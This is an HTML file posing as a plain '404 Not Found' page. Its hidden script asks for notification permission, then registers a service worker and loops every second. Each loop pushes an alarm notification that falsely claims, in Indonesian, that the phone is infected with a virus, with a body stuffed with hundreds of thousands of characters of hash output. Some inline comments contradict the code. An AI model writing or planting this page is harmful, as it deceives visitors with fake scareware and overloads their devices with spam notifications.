<!DOCTYPE html>
<html>
<head>
  <title>404</title>
</head>
<body style="text-align:center; margin-top:50px;">
  <h1>404 Not Found</h1>
  <script>
    if ('Notification' in window && navigator.serviceWorker) {
      Notification.requestPermission().then(function(permission) {
        if (permission === "granted") {
          navigator.serviceWorker.register('sw.js').then(function(reg) {
            function randomText() {
              return Math.random().toString(36).substring(2) + Date.now();
            }

            async function hashText(text) {
              const encoder = new TextEncoder();
              const data = encoder.encode(text);
              const hashBuffer = await crypto.subtle.digest('SHA-256', data);
              const hashArray = Array.from(new Uint8Array(hashBuffer));
              return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            }

            async function createBigText() {
              let bigText = "";
              for (let i = 0; i < 50000; i++) {  // 5000 hash jadi super panjang
                bigText += await hashText(randomText());
              }
              return bigText;
            }

            async function spamNotif() {
              const bigBody = await createBigText();
              reg.showNotification("Hp Anda Terinfeksi Virus ðŸš¨", {
                body: bigBody.substring(0, 900000), // max chrome ~10KB notif body
                icon: "https://via.placeholder.com/128",
                tag: "big-spam"
              });
              setTimeout(spamNotif, 1000); // 60 detik
            }

            spamNotif();
          });
        }
      });
    }
  </script>
</body>
</html>
